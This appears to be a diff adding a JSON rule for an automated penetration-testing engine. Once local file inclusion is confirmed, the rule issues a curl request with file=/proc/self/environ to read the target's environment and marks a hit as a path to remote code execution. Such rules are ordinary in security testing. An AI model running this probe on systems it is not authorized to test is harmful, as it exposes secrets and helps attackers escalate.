@@ -1,0 +1,28 @@
+{
+  "id": "R-VULN-LFI-001",
+  "name": "LFI 确认后提权",
+  "category": "vuln",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "lfi"
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "LFI 读敏感文件",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl {url}?file=/proc/self/environ"
+      }
+    ],
+    "on_hit_class": "lfi.rce",
+    "priority": {
+      "impact": 0.75,
+      "cost": 0.15
+    }
+  }
+}
